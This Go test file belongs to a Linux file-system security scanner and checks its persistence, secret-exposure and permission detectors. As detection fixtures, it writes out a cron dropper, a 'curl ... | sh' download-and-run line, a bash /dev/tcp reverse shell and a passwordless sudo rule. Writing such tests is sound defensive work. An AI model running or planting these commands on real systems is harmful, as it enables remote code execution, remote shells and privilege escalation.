package detectors

import (
	"os"
	"strings"
	"testing"

	"lisa/internal/fsscan"
	"lisa/internal/model"
)

var formerFalsePositives = []struct {
	name string
	path string
}{
	{"tool directory containing cron", "/opt/app/crontab-manager/data.json"},
	{"documentation mentioning init.d", "/usr/share/doc/init.d-readme.txt"},
	{"temporary directory containing xdg", "/tmp/xdg-test/file"},
	{"project directory containing bashrc", "/home/user/project/bashrc-theme/.git/config"},
	{"unrelated word xdg", "/srv/xdg-tools/config"},
	{"directory named profile under home", "/home/user/profile_uploads/avatar.png"},
	{"file named crontab outside cron", "/opt/vendor/crontab"},
	{"directory merely starting with tmp", "/tmpdata/service.log"},
	{"file under a home tmp directory", "/home/alice/tmp/scratch"},
	{"systemd in a project name", "/opt/systemd-units/db"},
	{"profile in a library path", "/usr/lib/profile.d/defaults"},
	{"autostart in an unrelated path", "/srv/autostart-tests/fixture"},
	{"environment variable name", "/etc/environment.d/99-site.conf"},
}

func TestFormerFalsePositivesProduceNoFindings(t *testing.T) {
	engine, err := NewEngine(Options{Identity: testIdentity(t), Now: fixedNow})
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	benignBody := "host=localhost\nmax_connections=100\nrelease=42\n"

	for _, testCase := range formerFalsePositives {
		t.Run(testCase.name, func(t *testing.T) {
			entry := entryAt(t, testCase.path, os.FileMode(0o644))
			reader := newStubReader(map[string]string{testCase.path: benignBody})
			ctx := testContext(entry, reader)
			ctx.UID, ctx.GID, ctx.User, ctx.Group, ctx.HaveOwner = 0, 0, "root", "root", true

			for _, detector := range engine.registry.detectors {
				for _, finding := range detector.Detect(ctx) {
					t.Errorf("%s produced %s (%s) for the benign path %s",
						detector.Name(), finding.RuleID, finding.Title, testCase.path)
				}
			}
		})
	}
}

func TestFormerFalsePositivesAreNotPersistenceTargets(t *testing.T) {
	engine, err := NewEngine(Options{Identity: testIdentity(t), Now: fixedNow})
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	maliciousBody := strings.Join([]string{
		"* * * * * root /tmp/dropper",
		"curl http://example.invalid/x | sh",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"password = " + canaryPassword,
	}, "\n")

	persistenceRules := map[string]bool{
		"LS-PERS-001": true, "LS-PERS-002": true, "LS-PERS-003": true, "LS-PERS-004": true,
		"LS-PERS-005": true, "LS-PERS-006": true, "LS-PERS-007": true, "LS-PERS-008": true,
		"LS-PERS-009": true, "LS-PERS-010": true, "LS-PERS-011": true, "LS-SENS-005": true,
	}

	for _, testCase := range formerFalsePositives {
		t.Run(testCase.name, func(t *testing.T) {
			entry := entryAt(t, testCase.path, os.FileMode(0o644))
			reader := newStubReader(map[string]string{testCase.path: maliciousBody})
			ctx := testContext(entry, reader)
			ctx.UID, ctx.GID, ctx.User, ctx.Group, ctx.HaveOwner = 0, 0, "root", "root", true

			for _, detector := range engine.registry.detectors {
				for _, finding := range detector.Detect(ctx) {
					if persistenceRules[finding.RuleID] {
						t.Errorf("%s treated %s as a persistence location and produced %s (%s)",
							detector.Name(), testCase.path, finding.RuleID, finding.Title)
					}
				}
			}
		})
	}
}

func TestFormerFalsePositivesSurviveEngineProcessing(t *testing.T) {
	engine, err := NewEngine(Options{Identity: testIdentity(t), Now: fixedNow})
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	benignBody := "host=localhost\nmax_connections=100\n"

	for _, testCase := range formerFalsePositives {
		entry := entryAt(t, testCase.path, os.FileMode(0o644))
		_ = benignBody

		for _, finding := range engine.Process(entry) {
			switch finding.Category {
			case model.CategoryPersistence, model.CategorySensitiveConfig:
				t.Errorf("%s produced %s (%s, category %s) for the benign path %s",
					finding.RuleID, finding.RuleID, finding.Title, finding.Category, testCase.path)
			}
		}
	}
}

func TestBenignSystemFilesProduceNoFindings(t *testing.T) {
	benign := []struct {
		path string
		mode os.FileMode
	}{
		{"/etc/passwd", os.FileMode(0o644)},
		{"/etc/group", os.FileMode(0o644)},
		{"/etc/ssh/sshd_config", os.FileMode(0o644)},
		{"/etc/sudoers", os.FileMode(0o440)},
		{"/etc/crontab", os.FileMode(0o644)},
		{"/etc/ld.so.preload", os.FileMode(0o644)},
		{"/etc/rc.local", os.FileMode(0o755)},
		{"/usr/bin/sudo", os.FileMode(0o4755)},
		{"/home/alice/.ssh/id_rsa", os.FileMode(0o600)},
		{"/home/alice/.ssh/authorized_keys", os.FileMode(0o600)},
		{"/usr/local/bin/deploy.sh", os.FileMode(0o755)},
		{"/opt/app/config.yaml", os.FileMode(0o644)},
		{"/var/log/syslog", os.FileMode(0o640)},
	}

	engine, err := NewEngine(Options{Identity: testIdentity(t), Now: fixedNow})
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	for _, testCase := range benign {
		t.Run(testCase.path, func(t *testing.T) {
			body := "host=localhost\nport=22\nmax_connections=100\n"
			if testCase.path == "/usr/bin/sudo" {
				body = "\x7fELF\x02\x01\x01\x00"
			}
			if testCase.path == "/usr/local/bin/deploy.sh" {
				body = "#!/bin/bash\n/usr/local/bin/deploy --safe\n"
			}
			reader := newStubReader(map[string]string{testCase.path: body})
			ctx := testContext(entryAt(t, testCase.path, testCase.mode), reader)
			ctx.UID, ctx.GID, ctx.User, ctx.Group, ctx.HaveOwner = 0, 0, "root", "root", true

			for _, detector := range engine.registry.detectors {
				for _, finding := range detector.Detect(ctx) {
					if finding.Severity == model.SeverityHigh || finding.Severity == model.SeverityCritical {
						t.Errorf("%s produced high severity %s (%s) for a correctly configured file",
							detector.Name(), finding.RuleID, finding.Title)
					}
				}
			}
		})
	}
}

func TestOwnerAndGroupCommandsAreNotFlaggedAsSecrets(t *testing.T) {
	const path = "/etc/passwd"
	reader := newStubReader(map[string]string{path: "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"})

	findings := runDetectorOn(t, secretExposureDetector{}, entryAt(t, path, os.FileMode(0o644)), reader)
	if len(findings) != 0 {
		t.Errorf("a passwd file produced %v; it must be excluded from secret scanning", ruleIDs(findings))
	}
}

func TestStickyTemporaryDirectoriesAreContextual(t *testing.T) {
	findings := runDetectorOn(t, worldWritableDetector{},
		dirEntryAt(t, "/tmp", os.FileMode(0o777)|os.ModeSticky), nil)
	if len(findings) != 1 || findings[0].RuleID != "LS-PERM-003" {
		t.Fatalf("/tmp produced %v, want a single informational sticky-bit finding", ruleIDs(findings))
	}
	if findings[0].Severity != model.SeverityInfo {
		t.Errorf("Severity = %v, want info for a conventional sticky temporary directory", findings[0].Severity)
	}
}

func TestEveryRuleIsReachableOrDocumented(t *testing.T) {
	engine, err := NewEngine(Options{Identity: testIdentity(t), Now: fixedNow})
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	tail := strings.Join([]string{
		"* * * * * root /tmp/dropper",
		"curl http://example.invalid/x | sh",
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"password = " + canaryPassword,
		"api_key=" + canaryAPIKey,
		"-----BEGIN RSA PRIVATE KEY-----",
		"Authorization: Bearer " + canaryBearer,
		"AWS_SECRET_ACCESS_KEY=" + canaryToken,
		"aws_access_key_id = " + canaryAWSKey,
		"PermitRootLogin yes",
		"PermitEmptyPasswords yes",
		"PermitUserEnvironment yes",
		"PasswordAuthentication yes",
		"alice ALL=(ALL) NOPASSWD: ALL",
	}, "\n")

	elfBody := "\x7fELF\x02\x01\x01\x00binary\n" + tail
	scriptBody := "#!/bin/bash\n/usr/local/bin/tool\n" + tail
	plainBody := tail

	suidMode := os.FileMode(0o755) | os.ModeSetuid | os.ModeSetgid
	stickyMode := os.FileMode(0o777) | os.ModeSticky

	samples := []struct {
		entry fsscan.Entry
		body  string
	}{
		{entryAt(t, "/etc/shadow", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/etc/gshadow", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/etc/sudoers.d/90-x", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/passwd", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/fstab", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/home/a/.ssh/id_rsa", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/home/a/.ssh/authorized_keys", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/usr/bin/sudo", suidMode), elfBody},
		{entryAt(t, "/opt/app/tool", suidMode), elfBody},
		{entryAt(t, "/usr/bin/wall", os.FileMode(0o755)|os.ModeSetgid), elfBody},
		{entryAt(t, "/etc/systemd/system/x.service", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/cron.d/x", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/crontab", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/home/a/.bashrc", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/home/a/.config/autostart/x.desktop", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/init.d/x", os.FileMode(0o777)), plainBody},
		{entryAt(t, "/etc/rc.local", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/etc/ld.so.preload", os.FileMode(0o666)), plainBody},
		{entryAt(t, "/etc/ssh/sshd_config", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/etc/sudoers", os.FileMode(0o440)), plainBody},
		{entryAt(t, "/etc/app.conf", os.FileMode(0o644)), plainBody},
		{entryAt(t, "/tmp/x", os.FileMode(0o755)), elfBody},
		{entryAt(t, "/tmp/y", os.FileMode(0o666)), elfBody},
		{entryAt(t, "/home/a/Documents/x.pdf", os.FileMode(0o755)), elfBody},
		{entryAt(t, "/srv/z.txt", os.FileMode(0o644)), elfBody},
		{entryAt(t, "/home/a/Documents/q.pdf", os.FileMode(0o644)), scriptBody},
		{entryAt(t, "/srv/w.txt", os.FileMode(0o644)), scriptBody},
		{entryAt(t, "/home/a/Downloads/setup", os.FileMode(0o755)), scriptBody},
		{entryAt(t, "/home/a/Downloads/invoice", os.FileMode(0o755)), elfBody},
		{entryAt(t, "/srv/f", os.FileMode(0o666)), plainBody},
		{dirEntryAt(t, "/srv/d", os.FileMode(0o777)), plainBody},
		{dirEntryAt(t, "/srv/shared", stickyMode), plainBody},
		{dirEntryAt(t, "/tmp", stickyMode), plainBody},
	}

	reachable := map[string]bool{}
	for _, sample := range samples {
		reader := newStubReader(map[string]string{sample.entry.Path: sample.body})
		ctx := testContext(sample.entry, reader)
		ctx.Identity = testIdentity(t)
		ctx.UID, ctx.GID, ctx.HaveOwner = 4242, 4243, true

		for _, detector := range engine.registry.detectors {
			for _, finding := range detector.Detect(ctx) {
				reachable[finding.RuleID] = true
			}
		}
	}

	unreachable := []string{}
	for _, rule := range allRules() {
		if rule.ID == "LS-PRIV-004" {
			continue
		}
		if !reachable[rule.ID] {
			unreachable = append(unreachable, rule.ID+" ("+rule.Title+")")
		}
	}
	if len(unreachable) > 0 {
		t.Errorf("rules not produced by the reachability sweep:\n  %s", strings.Join(unreachable, "\n  "))
	}
}
